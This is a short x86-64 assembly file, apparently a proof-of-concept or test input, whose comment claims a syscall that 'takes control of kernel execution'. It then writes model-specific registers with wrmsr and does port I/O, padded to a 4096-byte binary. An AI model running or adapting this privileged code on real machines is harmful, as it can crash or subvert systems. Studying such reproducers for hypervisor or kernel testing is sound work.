[BITS 64]

org 0x1000  ; start at 0x1000

global _start
_start:

;syscall to take controll of kernel execution
lea r9, [kernelPart]
xor r9, 0x203E
lea r8, [buffer1]
mov rax, 0x4d6c
xor r10,r10
syscall

kernelPart:

mov rax,0x2ff2
mov ecx, 0x1c8
mov rdx, rax
shr rdx, 0x20
wrmsr

lea rax, buffer2
mov ecx, 0x7b
mov rdx, rax
shr rdx, 0x20
wrmsr

mov rax, 0x0
mov ecx, 0x315
mov rdx, rax
shr rdx, 0x20
wrmsr

mov rcx, 0x1
mov rdx, 0x29a
mov rdi, dummy
insb

mov eax, 0x1
xor edx, edx
mov ecx, 0x6f
wrmsr

ret

buffer1: db 0x10 dup(0xff)
buffer2: dq 0x0, 0x9558000000000000
dummy: db 0x10 dup(0x0)

db 0x1000 dup (0x0)  ; padding, output binary file hast to be 4096b or bigger in size

